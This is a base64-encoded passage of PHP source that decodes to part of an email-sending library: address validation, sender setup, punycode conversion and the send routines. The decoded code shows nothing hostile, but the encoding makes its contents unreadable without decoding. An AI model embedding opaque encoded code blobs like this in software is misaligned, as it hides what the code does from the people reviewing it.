JGFkZHJzdHIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsNCiAgICAgICAgICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOw0KICAgICAgICAgICAgICAgIGlmIChzdHJwb3MoJGFkZHJlc3MsICc8JykgPT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+ICcnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhZGRyZXNzJyA9PiAkYWRkcmVzcw0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGxpc3QoJG5hbWUsICRlbWFpbCkgPSBleHBsb2RlKCc8JywgJGFkZHJlc3MpOw0KICAgICAgICAgICAgICAgICAgICAkZW1haWwgPSB0cmltKHN0cl9yZXBsYWNlKCc+JywgJycsICRlbWFpbCkpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkZW1haWwpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzc2VzW10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gdHJpbShzdHJfcmVwbGFjZShhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJyInLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJyINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApLCAnJywgJG5hbWUpKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWRkcmVzcycgPT4gJGVtYWlsDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkYWRkcmVzc2VzOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0RnJvbSgkYWRkcmVzcywgJG5hbWUgPSAnJywgJGF1dG8gPSB0cnVlKSB7DQogICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7DQogICAgICAgICRuYW1lICAgID0gdHJpbShwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkbmFtZSkpOw0KICAgICAgICBpZiAoKCRwb3MgPSBzdHJycG9zKCRhZGRyZXNzLCAnQCcpKSA9PT0gZmFsc2Ugb3IgKCEkdGhpcy0+aGFzOGJpdENoYXJzKHN1YnN0cigkYWRkcmVzcywgKyskcG9zKSkgb3IgISR0aGlzLT5pZG5TdXBwb3J0ZWQoKSkgYW5kICEkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzKSkgew0KICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAiIChzZXRGcm9tKSAkYWRkcmVzcyI7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+RnJvbSAgICAgPSAkYWRkcmVzczsNCiAgICAgICAgJHRoaXMtPkZyb21OYW1lID0gJG5hbWU7DQogICAgICAgIGlmICgkYXV0bykgew0KICAgICAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT5TZW5kZXIpKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPlNlbmRlciA9ICRhZGRyZXNzOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TGFzdE1lc3NhZ2VJRCgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5sYXN0TWVzc2FnZUlEOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcywgJHBhdHRlcm5zZWxlY3QgPSBudWxsKSB7DQogICAgICAgIGlmIChpc19udWxsKCRwYXR0ZXJuc2VsZWN0KSkgew0KICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSBzZWxmOjokdmFsaWRhdG9yOw0KICAgICAgICB9DQogICAgICAgIGlmIChpc19jYWxsYWJsZSgkcGF0dGVybnNlbGVjdCkpIHsNCiAgICAgICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuYygkcGF0dGVybnNlbGVjdCwgJGFkZHJlc3MpOw0KICAgICAgICB9DQogICAgICAgIGlmIChzdHJwb3MoJGFkZHJlc3MsICJcbiIpICE9PSBmYWxzZSBvciBzdHJwb3MoJGFkZHJlc3MsICJcciIpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmICghJHBhdHRlcm5zZWxlY3Qgb3IgJHBhdHRlcm5zZWxlY3QgPT0gJ2F1dG8nKSB7DQogICAgICAgICAgICBpZiAoZGVmaW5lZCgnUENSRV9WRVJTSU9OJykpIHsNCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBDUkVfVkVSU0lPTiwgJzguMC4zJykgPj0gMCkgew0KICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlOCc7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGNyZSc7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnZXh0ZW5zaW9uX2xvYWRlZCcpIGFuZCBleHRlbnNpb25fbG9hZGVkKCdwY3JlJykpIHsNCiAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMi4wJykgPj0gMCkgew0KICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwaHAnOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ25vcmVnZXgnOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBzd2l0Y2ggKCRwYXR0ZXJuc2VsZWN0KSB7DQogICAgICAgICAgICBjYXNlICdwY3JlOCc6DQogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKSBwcmVnX21hdGNoKCcvXig/ISg/Pig/MSkiPyg/PlxcXFsgLX5dfFteIl0pIj8oPzEpKXsyNTUsfSkoPyEoPz4oPzEpIj8oPz5cXFxbIC1+XXxbXiJdKSI/KD8xKSl7NjUsfUApJyAuICcoKD8+KD8+KD8+KCg/Pig/Pig/Plx4MERceDBBKT9bXHQgXSkrfCg/PltcdCBdKlx4MERceDBBKT9bXHQgXSspPykoXCgoPz4oPzIpJyAuICcoPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLVwnKi1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4N0ZdfCg/MykpKSooPzIpXCkpKSsoPzIpKXwoPzIpKT8pJyAuICcoWyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/MikoPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLSEjLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHg3Rl0pKSonIC4gJyg/MikiKSg/Pig/MSlcLig/MSkoPzQpKSooPzEpQCg/ISg/MSlbYS16MC05LV17NjQsfSkoPzEpKD8+KFthLXowLTldKD8+W2EtejAtOS1dKlthLXowLTldKT8pJyAuICcoPz4oPzEpXC4oPyEoPzEpW2EtejAtOS1dezY0LH0pKD8xKSg/NSkpezAsMTI2fXxcWyg/Oig/PklQdjY6KD8+KFthLWYwLTldezEsNH0pKD8+Oig/Nikpezd9JyAuICd8KD8hKD86LipbYS1mMC05XVs6XF1dKXs4LH0pKCg/NikoPz46KD82KSl7MCw2fSk/OjooPzcpPykpfCg/Pig/PklQdjY6KD8+KD82KSg/PjooPzYpKXs1fTonIC4gJ3woPyEoPzouKlthLWYwLTldOil7Nix9KSg/OCk/OjooPz4oKD82KSg/PjooPzYpKXswLDR9KTopPykpPygyNVswLTVdfDJbMC00XVswLTldfDFbMC05XXsyfScgLiAnfFsxLTldP1swLTldKSg/PlwuKD85KSl7M30pKVxdKSg/MSkkL2lzRCcsICRhZGRyZXNzKTsNCiAgICAgICAgICAgIGNhc2UgJ3BjcmUnOg0KICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbGVhbikgcHJlZ19tYXRjaCgnL14oPyEoPz4iPyg/PlxcXFsgLX5dfFteIl0pIj8pezI1NSx9KSg/ISg/PiI/KD8+XFxcWyAtfl18W14iXSkiPyl7NjUsfUApKD8+JyAuICdbISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS0hIy1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4RkZdKSkqIiknIC4gJyg/PlwuKD8+WyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtISMtXFtcXS1ceDdGXXxcXFxbXHgwMC1ceEZGXSkpKiIpKSonIC4gJ0AoPz4oPyFbYS16MC05LV17NjQsfSkoPz5bYS16MC05XSg/PlthLXowLTktXSpbYS16MC05XSk/KSg/PlwuKD8hW2EtejAtOS1dezY0LH0pJyAuICcoPz5bYS16MC05XSg/PlthLXowLTktXSpbYS16MC05XSk/KSl7MCwxMjZ9fFxbKD86KD8+SVB2NjooPz4oPz5bYS1mMC05XXsxLDR9KSg/PjonIC4gJ1thLWYwLTldezEsNH0pezd9fCg/ISg/Oi4qW2EtZjAtOV1bOlxdXSl7OCx9KSg/PlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw2fSk/JyAuICc6Oig/PlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw2fSk/KSl8KD8+KD8+SVB2NjooPz5bYS1mMC05XXsxLDR9KD8+OicgLiAnW2EtZjAtOV17MSw0fSl7NX06fCg/ISg/Oi4qW2EtZjAtOV06KXs2LH0pKD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDR9KT8nIC4gJzo6KD8+KD86W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDR9KTopPykpPyg/PjI1WzAtNV18MlswLTRdWzAtOV18MVswLTldezJ9JyAuICd8WzEtOV0/WzAtOV0pKD8+XC4oPz4yNVswLTVdfDJbMC00XVswLTldfDFbMC05XXsyfXxbMS05XT9bMC05XSkpezN9KSlcXSkkL2lzRCcsICRhZGRyZXNzKTsNCiAgICAgICAgICAgIGNhc2UgJ2h0bWw1JzoNCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pIHByZWdfbWF0Y2goJy9eW2EtekEtWjAtOS4hIyQlJlwnKitcLz0/Xl9ge3x9fi1dK0BbYS16QS1aMC05XSg/OlthLXpBLVowLTktXXswLDYxfScgLiAnW2EtekEtWjAtOV0pPyg/OlwuW2EtekEtWjAtOV0oPzpbYS16QS1aMC05LV17MCw2MX1bYS16QS1aMC05XSk/KSokL3NEJywgJGFkZHJlc3MpOw0KICAgICAgICAgICAgY2FzZSAnbm9yZWdleCc6DQogICAgICAgICAgICAgICAgcmV0dXJuIChzdHJsZW4oJGFkZHJlc3MpID49IDMgYW5kIHN0cnBvcygkYWRkcmVzcywgJ0AnKSA+PSAxIGFuZCBzdHJwb3MoJGFkZHJlc3MsICdAJykgIT0gc3RybGVuKCRhZGRyZXNzKSAtIDEpOw0KICAgICAgICAgICAgY2FzZSAncGhwJzoNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKSBmaWx0ZXJfdmFyKCRhZGRyZXNzLCBGSUxURVJfVkFMSURBVEVfRU1BSUwpOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBpZG5TdXBwb3J0ZWQoKSB7DQogICAgICAgIHJldHVybiBmdW5jdGlvbl9leGlzdHMoJ2lkbl90b19hc2NpaScpIGFuZCBmdW5jdGlvbl9leGlzdHMoJ21iX2NvbnZlcnRfZW5jb2RpbmcnKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHB1bnllbmNvZGVBZGRyZXNzKCRhZGRyZXNzKSB7DQogICAgICAgIGlmICgkdGhpcy0+aWRuU3VwcG9ydGVkKCkgYW5kICFlbXB0eSgkdGhpcy0+Q2hhclNldCkgYW5kICgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkZG9tYWluID0gc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoJGRvbWFpbikgYW5kIEBtYl9jaGVja19lbmNvZGluZygkZG9tYWluLCAkdGhpcy0+Q2hhclNldCkpIHsNCiAgICAgICAgICAgICAgICAkZG9tYWluID0gbWJfY29udmVydF9lbmNvZGluZygkZG9tYWluLCAnVVRGLTgnLCAkdGhpcy0+Q2hhclNldCk7DQogICAgICAgICAgICAgICAgaWYgKCgkcHVueWNvZGUgPSBkZWZpbmVkKCdJTlRMX0lETkFfVkFSSUFOVF9VVFM0NicpID8gaWRuX3RvX2FzY2lpKCRkb21haW4sIDAsIElOVExfSUROQV9WQVJJQU5UX1VUUzQ2KSA6IGlkbl90b19hc2NpaSgkZG9tYWluKSkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdWJzdHIoJGFkZHJlc3MsIDAsICRwb3MpIC4gJHB1bnljb2RlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGFkZHJlc3M7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZW5kKCkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKCEkdGhpcy0+cHJlU2VuZCgpKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5wb3N0U2VuZCgpOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4Yykgew0KICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgPSAnJzsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcHJlU2VuZCgpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICR0aGlzLT5lcnJvcl9jb3VudCA9IDA7DQogICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAgPSAnJzsNCiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5X21lcmdlKCR0aGlzLT5SZWNpcGllbnRzUXVldWUsICR0aGlzLT5SZXBseVRvUXVldWUpIGFzICRwYXJhbXMpIHsNCiAgICAgICAgICAgICAgICAkcGFyYW1zWzFdID0gJHRoaXMtPnB1bnllbmNvZGVBZGRyZXNzKCRwYXJhbXNbMV0pOw0KICAgICAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAkdGhpcywNCiAgICAgICAgICAgICAgICAgICAgJ2FkZEFuQWRkcmVzcycNCiAgICAgICAgICAgICAgICApLCAkcGFyYW1zKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgoY291bnQoJHRoaXMtPnRvKSArIGNvdW50KCR0aGlzLT5jYykgKyBjb3VudCgkdGhpcy0+YmNjKSkgPCAxKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygncHJvdmlkZV9hZGRyZXNzJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXkoDQogICAgICAgICAgICAgICAgJ0Zyb20nLA0KICAgICAgICAgICAgICAgICdTZW5kZXInLA0KICAgICAgICAgICAgICAgICdDb25maXJtUmVhZGluZ1RvJw0KICAgICAgICAgICAgKSBhcyAkYWRkcmVzc19raW5kKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPiRhZGRyZXNzX2tpbmQgPSB0cmltKCR0aGlzLT4kYWRkcmVzc19raW5kKTsNCiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPiRhZGRyZXNzX2tpbmQpKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkdGhpcy0+JGFkZHJlc3Nfa2luZCA9ICR0aGlzLT5wdW55ZW5jb2RlQWRkcmVzcygkdGhpcy0+JGFkZHJlc3Nfa2luZCk7DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT4kYWRkcmVzc19raW5kKSkgew0KICAgICAgICAgICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICcgKHB1bnlFbmNvZGUpICcgLiAkdGhpcy0+JGFkZHJlc3Nfa2luZDsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9ICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmUnOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHRoaXMtPnNldE1lc3NhZ2VUeXBlKCk7DQogICAgICAgICAgICBpZiAoISR0aGlzLT5BbGxvd0VtcHR5IGFuZCBlbXB0eSgkdGhpcy0+Qm9keSkpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdlbXB0eV9tZXNzYWdlJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSAnJzsNCiAgICAgICAgICAgICR0aGlzLT5NSU1FQm9keSAgID0gJHRoaXMtPmNyZWF0ZUJvZHkoKTsNCiAgICAgICAgICAgICR0ZW1waGVhZGVycyAgICAgID0gJHRoaXMtPk1JTUVIZWFkZXI7DQogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9ICR0aGlzLT5jcmVhdGVIZWFkZXIoKTsNCiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyIC49ICR0ZW1waGVhZGVyczsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdtYWlsJykgew0KICAgICAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+YWRkckFwcGVuZCgnVG8nLCAkdGhpcy0+dG8pOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKCdUbycsICd1bmRpc2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1N1YmplY3QnLCAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIodHJpbSgkdGhpcy0+U3ViamVjdCkpKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5ES0lNX2RvbWFpbikgJiYgIWVtcHR5KCR0aGlzLT5ES0lNX3NlbGVjdG9yKSAmJiAoIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nKSB8fCAoIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGUpICYmIGZpbGVfZXhpc3RzKCR0aGlzLT5ES0lNX3ByaXZhdGUpKSkpIHsNCiAgICAgICAgICAgICAgICAkaGVhZGVyX2RraW0gICAgICA9ICR0aGlzLT5ES0lNX0FkZCgkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyLCAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9IHJ0cmltKCR0aGlzLT5NSU1FSGVhZGVyLCAiXHJcbiAiKSAuIHNlbGY6OkNSTEYgLiBzdHJfcmVwbGFjZSgiXHJcbiIsICJcbiIsICRoZWFkZXJfZGtpbSkgLiBzZWxmOjpDUkxGOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93ICRleGM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHBvc3RTZW5kKCkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgc3dpdGNoICgkdGhpcy0+TWFpbGVyKSB7DQogICAgICAgICAgICAgICAgY2FzZSAnc2VuZG1haWwnOg0KICAgICAgICAgICAgICAgIGNhc2UgJ3FtYWlsJzoNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kbWFpbFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7DQogICAgICAgICAgICAgICAgY2FzZSAnc210cCc6DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c210cFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7DQogICAgICAgICAgICAgICAgY2FzZSAnbWFpbCc6DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bWFpbFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7DQogICAgICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAgICAgJHNlbmRNZXRob2QgPSAkdGhpcy0+TWFpbGVyIC4gJ1NlbmQnOw0KICAgICAgICAgICAgICAgICAgICBpZiAobWV0aG9kX2V4aXN0cygkdGhpcywgJHNlbmRNZXRob2QpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPiRzZW5kTWV0aG9kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bWFpbFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93ICRleGM7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VuZG1haWxTZW5kKCRoZWFkZXIsICRib2R5KSB7DQogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kIHNlbGY6OmlzU2hlbGxTYWZlKCR0aGlzLT5TZW5kZXIpKSB7DQogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAncW1haWwnKSB7DQogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzIC1mJXMnOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLW9pIC1mJXMgLXQnOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ3FtYWlsJykgew0KICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyc7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtb2kgLXQnOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRzZW5kbWFpbCA9IHNwcmludGYoJHNlbmRtYWlsRm10LCBAZXNjYXBlc2hlbGxjbWQoJHRoaXMtPlNlbmRtYWlsKSwgJHRoaXMtPlNlbmRlcik7DQogICAgICAgIGlmICgkdGhpcy0+U2luZ2xlVG8pIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCR0aGlzLT5TaW5nbGVUb0FycmF5IGFzICR0b0FkZHIpIHsNCiAgICAgICAgICAgICAgICBpZiAoIUAkbWFpbCA9IHBvcGVuKCRzZW5kbWFpbCwgJ3cnKSkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJ1RvOiAnIC4gJHRvQWRkciAuICJcbiIpOw0KICAgICAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkaGVhZGVyKTsNCiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJGJvZHkpOw0KICAgICAgICAgICAgICAgICRyZXN1bHQgPSBwY2xvc2UoJG1haWwpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCgkcmVzdWx0ID09IDApLCBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJHRvQWRkcg0KICAgICAgICAgICAgICAgICksICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7DQogICAgICAgICAgICAgICAgaWYgKCRyZX